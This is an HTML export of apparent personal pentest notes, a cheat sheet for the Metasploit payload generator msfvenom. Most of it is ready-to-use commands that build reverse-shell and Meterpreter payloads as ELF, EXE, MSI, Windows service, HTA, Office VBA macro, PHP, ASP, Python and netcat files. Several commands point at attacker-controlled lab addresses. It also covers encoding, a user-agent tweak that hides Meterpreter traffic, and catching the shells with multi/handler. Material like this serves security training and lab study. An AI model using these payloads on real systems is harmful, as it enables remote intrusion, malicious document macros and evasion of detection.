<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>msfvenom</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>msfvenom</h1><br/><p><strong>Msfvenom</strong> will allow    you to access all payloads available in the Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux,    etc.).</p><p></p><p></p><p><strong>To List All Payloads:</strong></p><p>msfvenom --list payloads</p><p>msfvenom -l payloads</p><p></p><p><strong>To List All Payload Options:</strong></p><p></p><p>You can use the --list-options flag combined with the payload</p><p>Eg. msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options</p><p></p><p><strong>Output formats:</strong></p><p>You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). </p><p></p><p>msfvenom --list formats</p><p>msfvenom -l formats</p><p></p><p><strong>Encoders:</strong></p><p></p><p>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64</p><p></p><p>O/P: </p><p></p><p>The output format is raw. (with: -f raw)</p><p>The PHP code is encoded to base64 (with: -e php/base64)</p><p></p><p><strong></strong></p><p><strong>Linux Executable and Linkable Format (elf)</strong></p><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</p><p></p><p>Note: The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line. </p><p></p><p><strong>Windows</strong></p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</p><p></p><p><strong>Windows Installer</strong></p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi</p><p></p><p><strong>Windows Service </strong></p><p>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.X.X PORT=XXXX -e x86/shikata_ga_nai -f exe-service -o Advanced.exe</p><p></p><p><strong>Windows HTA Reverse Shell</strong></p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.31 LPORT=8888 -f hta-psh -o thm.hta</p><p></p><p><strong>Microsot Office VBA Macro Reverse Shell</strong></p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.72.31 LPORT=8888 -f vba        [Copy the code into your macro]</p><p></p><p><strong>PHP</strong></p><p>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</p><p></p><p><strong>ASP</strong></p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</p><p></p><p><strong>Python</strong></p><p>msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py</p><p></p><p><strong>Netcat Raw</strong></p><p>msfvenom -p cmd/unix/reverse_netcat lhost=10.11.72.31 lport=8888 R &gt; shell.sh</p><p></p><p><strong>CMD Command Execution</strong></p><p>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o temp_share/shell.elf</p><p></p><p></p><p></p><p><strong>Standard Syntax:</strong></p><p>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</p><p></p><p><strong>Naming Convention:</strong></p><p>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</p><p>eg</p><p>linux/x86/shell_reverse_tcp</p><p></p><p>Exception: Windows 32 bit target the arch is not specified -- windows/shell_reverse_tcp</p><p></p><p><strong>Staged (&quot;/&quot; Separation)</strong></p><p>shell/reverse_tcp</p><p>windows/x64/meterpreter/reverse_tcp</p><p></p><p><strong>Stageless (“_” Separation)</strong></p><p>shell_reverse_tcp</p><p>linux/x86/meterpreter_reverse_tcp</p><p></p><p></p><p><strong>Handlers:</strong></p><p>Used to catch incomming connections.</p><p></p><p>msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php</p><p></p><p>Once this is run on target system, we need to use:</p><p></p><p>use exploit/multi/handler</p><p></p><p>Multi/Handler is a superb tool for catching reverse shells. It&#39;s essential if you want to use Meterpreter shells, and is the go-to when using staged payloads. </p><p>Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.</p><p>To use the module, we will need to set the payload value (php/reverse_php in this case), the LHOST, and LPORT values. </p><p></p><p>set PAYLOAD php/reverse_php</p><p>set LHOST 10.0.2.19</p><p>set LPORT 7777</p><p></p><p></p><p><strong>Generating a Payload with Modified Headers:</strong></p><p></p><p>msfvenom -p windows/meterpreter/reverse_http LHOST=&lt;Attacker_IP&gt; LPORT=&lt;Port&gt; HttpUserAgent=NotMeterpreter -f exe -o shell.exe</p><p></p></div>
</body>
</html>
